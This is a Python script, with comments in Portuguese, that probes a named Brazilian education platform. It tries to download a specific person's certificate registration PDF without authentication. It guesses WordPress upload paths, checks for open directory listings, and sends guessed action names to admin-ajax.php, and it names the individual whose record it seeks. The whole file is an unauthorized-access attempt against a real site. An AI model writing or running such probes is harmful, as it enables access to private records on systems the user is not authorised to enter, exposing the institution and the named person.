import requests
from urllib.parse import urljoin

BASE_URL = 'https://ava.domalberto.edu.br'
DOC_PAGE = f'{BASE_URL}/solicitacao-de-documentos/'
UPLOADS_PATHS = [
    '/wp-content/uploads/',
    '/uploads/certificados/',
    '/certificados/',
]

TARGET_FILE_NAME = 'Ficha de Registro de Certificado - DOM (atualizada) - ROSEMARY SANTOS RODRIGUES OLIVEIRA - ANDRAGOGIA E FORMAÇÃO DE ADULTOS - 750 HORAS.pdf'

# Função para testar URLs diretas
def try_direct_download():
    print("🔍 Tentando download direto via URLs conhecidas...")
    tried = 0
    for path in UPLOADS_PATHS:
        test_url = urljoin(BASE_URL, f"{path}{TARGET_FILE_NAME.replace(' ', '%20')}")
        print(f"➡️ Testando: {test_url}")
        resp = requests.get(test_url)
        if resp.status_code == 200 and b'%PDF' in resp.content[:1024]:
            print(f"✅ Encontrado e baixado: {test_url}")
            with open('certificado_encontrado.pdf', 'wb') as f:
                f.write(resp.content)
            return True
        tried += 1
    print(f"❌ {tried} tentativas diretas não localizaram o arquivo.")
    return False

# Função para testar endpoint AJAX publicamente exposto
def try_admin_ajax():
    print("🔍 Tentando possíveis endpoints AJAX sem login...")
    ajax_url = urljoin(BASE_URL, '/wp-admin/admin-ajax.php')
    actions = ['listar_certificados', 'get_certificados', 'baixar_pdf', 'certificados']
    for action in actions:
        payload = {'action': action}
        print(f"➡️ Testando action: {action}")
        resp = requests.post(ajax_url, data=payload)
        if resp.status_code == 200 and 'pdf' in resp.text.lower():
            print(f"✅ Resposta positiva com action '{action}':\n{resp.text[:500]}...")
            return True
    print("❌ Nenhum action público respondeu com sucesso.")
    return False

# Função para testar diretórios expostos (directory listing)
def try_open_directories():
    print("🔍 Testando diretórios públicos...")
    for path in UPLOADS_PATHS:
        dir_url = urljoin(BASE_URL, path)
        print(f"➡️ Checando: {dir_url}")
        resp = requests.get(dir_url)
        if "Index of" in resp.text or '<title>Index' in resp.text:
            print(f"⚠️ Diretório possivelmente aberto: {dir_url}")
            return True
    print("❌ Nenhum diretório listado publicamente.")
    return False

# MAIN EXECUTION
if __name__ == "__main__":
    print("=== Iniciando busca sem autenticação ===\n")
    result1 = try_direct_download()
    result2 = try_open_directories()
    result3 = try_admin_ajax()
    
    if not (result1 or result2 or result3):
        print("\n⚠️ Nenhum método sem autenticação funcionou até agora.")
    else:
        print("\n✅ Alguma tentativa obteve resultado!")

